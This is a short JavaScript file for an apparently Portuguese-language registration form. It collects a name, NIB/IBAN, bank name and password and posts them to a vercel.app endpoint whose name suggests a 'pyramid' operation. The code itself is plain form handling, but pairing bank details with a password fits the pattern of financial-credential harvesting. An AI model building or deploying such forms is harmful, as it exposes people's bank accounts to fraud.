function apanha(id){
    return document.getElementById(id)
}

apanha("save").addEventListener("click",async function(){
    await verifica()
})

async function verifica(){
    let chek=apanha("acceptTerms").checked
    console.log(chek)
    if(chek==false){
        alert("Para podermos prosseguir tens de ler e aceitar os nossos termos")
    }
    else{
        let date=await getPosts()
        let len=date.length
        let empresa=date[len-1].empresa
        console.log(empresa)
        let nome=apanha("accountName").value
        let nib=apanha("nibIban").value
        let banco=apanha("bankName").value
        let senha=apanha("password").value
        console.log(nome)
        if(nome.length>1 && nib.length>1 && banco.length>1 && empresa.length>1){
            if(senha.length>7){
                await fetch("https://cvpiramide.vercel.app/data_cadastro",{
                    method:"post",
                    headers:{
                        "content-type":"application/json"
                    },
                    body:JSON.stringify({nome:nome,nib:nib,banco:banco,senha:senha,empresa:empresa})
                })
                alert("Dados enviados com sucesso")
                location.href="plano.html"
            }
            else{
                alert("Para sua segurança a senha tem que ter no minimo 8 digitos")
            }
        }
        else{
            alert("Preencha bem todos os campos")
        }
    }
}

async function getPosts() {
  return new Promise((resolve, reject) => {
    // Abrir a base de dados use_post
    const request = indexedDB.open("user_post", 1);

    request.onerror = () => {
      reject("Erro ao abrir a base de dados.");
    };

    request.onsuccess = () => {
      const db = request.result;

      // Abrir transação somente leitura na store "post"
      const transaction = db.transaction("post", "readonly");
      const store = transaction.objectStore("post");

      // Pegar todos os dados
      const getAllRequest = store.getAll();

      getAllRequest.onsuccess = () => {
        resolve(getAllRequest.result); // Retorna os dados
      };

      getAllRequest.onerror = () => {
        reject("Erro ao ler os dados.");
      };
    };

    // Caso seja necessário criar a store na primeira vez
    request.onupgradeneeded = (event) => {
      const db = event.target.result;
      if (!db.objectStoreNames.contains("post")) {
        db.createObjectStore("post", { keyPath: "id", autoIncrement: true });
      }
    };
  });
}

